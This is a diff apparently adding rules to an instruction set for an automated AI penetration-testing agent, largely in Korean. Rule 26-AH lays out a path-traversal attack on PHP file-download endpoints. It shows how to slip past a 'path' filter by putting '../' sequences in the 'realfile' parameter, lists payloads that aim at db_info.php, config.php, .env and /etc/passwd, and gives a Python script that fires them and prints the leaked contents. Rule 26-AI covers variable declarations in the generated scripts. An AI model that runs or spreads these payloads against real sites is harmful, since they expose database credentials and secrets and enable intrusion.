@@ -2813,6 +2813,77 @@ When fingerprint shows gnuboard5 / g5_ variables in page:
       s.proxies.update(PROXIES)
       s.verify = False
 
+  ── RULE 26-AH [v3.2.33]: 파일 다운로드 엔드포인트 LFI — path+realfile 분리 공략 ──
+
+  ▸ RULE 26-AH [v3.2.33]: download.php, filedown.php, file_download.do 등 파일 다운로드
+    엔드포인트는 특수한 LFI 패턴을 가진다. 반드시 아래 전략을 사용하라.
+
+    다운로드 엔드포인트 LFI 공략 원칙:
+    1. path 파라미터와 realfile 파라미터를 항상 분리하여 독립적으로 테스트하라.
+    2. PHP 소스에서 흔한 필터 패턴:
+       - path에 "../" 포함 시 → 차단 (die('00'))
+       - path에 "upload" 포함 안 하면 → 차단 (die('00'))
+       → 따라서: path는 반드시 "upload" 포함하고 "../" 없어야 한다
+       → 실제 경로 탈출은 realfile 파라미터에 넣는다
+    3. 올바른 공략 페이로드:
+         path=/uploads/files/../../include/   (또는 path=/uploads/)
+         realfile=../../include/db_info.php
+         → 최종 결합: /document_root/uploads/files/../../include/../../include/db_info.php
+    4. db_info.php, config.php, .env 등 설정 파일을 우선 타겟으로 한다.
+    5. 응답이 0B(빈 파일) 라면 realfile 파라미터의 경로 깊이(../의 개수)를 조정하라.
+
+    WRONG — realfile에만 경로 탈출 시도 (path 필터 우회 미고려):
+      ?path=../../../etc/passwd&realfile=passwd        # path에 "../" → 차단
+      ?realfile=../../../etc/passwd                     # realfile에만 시도 → 깊이 맞지 않음
+
+    CORRECT — path는 업로드 경로 유지, realfile로 탈출:
+      ?path=/uploads/files/../../include/&realfile=db_info.php
+      ?path=/uploads/&realfile=../../include/db_info.php
+      ?path=/board/upload/&realfile=../../../include/db_info.php
+
+    스크립트 예시:
+      import requests, urllib3
+      urllib3.disable_warnings()
+      BASE = "https://target.com"
+      PAYLOADS = [
+          {"path": "/uploads/files/../../include/", "realfile": "db_info.php"},
+          {"path": "/uploads/",                     "realfile": "../../include/db_info.php"},
+          {"path": "/board/upload/",                "realfile": "../../../include/db_info.php"},
+      ]
+      for p in PAYLOADS:
+          r = requests.get(f"{BASE}/board/download.php", params=p, verify=False, timeout=15)
+          print(f"[{r.status_code}] {len(r.content)}B | path={p['path']} realfile={p['realfile']}")
+          if r.status_code == 200 and len(r.content) > 10:
+              print(f"[FOUND] {r.text[:500]}")
+              break
+
+  ── RULE 26-AI [v3.2.33]: 병렬 스크립트 변수 독립 선언 — NameError 방지 ──
+
+  ▸ RULE 26-AI [v3.2.33]: 같은 라운드에 여러 스크립트를 생성할 때,
+    각 스크립트는 실행에 필요한 모든 변수를 내부에서 독립적으로 선언해야 한다.
+    한 스크립트에서 정의된 변수를 다른 스크립트에서 참조하면 NameError가 발생한다.
+
+    기본 필수 선언 목록 (모든 스크립트 상단에 포함):
+      import re, requests, urllib3, sys, os
+      urllib3.disable_warnings()
+      BASE_URL = "https://target.com"   # 반드시 각 스크립트에서 직접 선언
+
+    NameError 발생 원인:
+    - base_url, headers, session, cookies, base_params 등 공통 변수를
+      스크립트 A에서 정의하고 스크립트 B에서 참조하면 실패
+    - import re, import json 등 import 누락 후 re.search(), json.loads() 호출
+
+    WRONG — 다른 스크립트 변수 참조:
+      # 스크립트 1: base_params = {"type": "board"}
+      # 스크립트 2: params = {**base_params, "id": 1}  ← NameError: base_params
+
+    CORRECT — 각 스크립트에 독립 선언:
+      # 스크립트 2:
+      import re, requests, urllib3
+      urllib3.disable_warnings()
+      BASE = "https://target.com"
+      params = {"type": "board", "id": 1}   # base_params 직접 풀어서 선언
+
   ── 27. SQLi Extraction & Oracle Quality ──
 
   ▸ RULE 27-A: EXTRACTVALUE / UPDATEXML result extraction — use the MySQL error format.
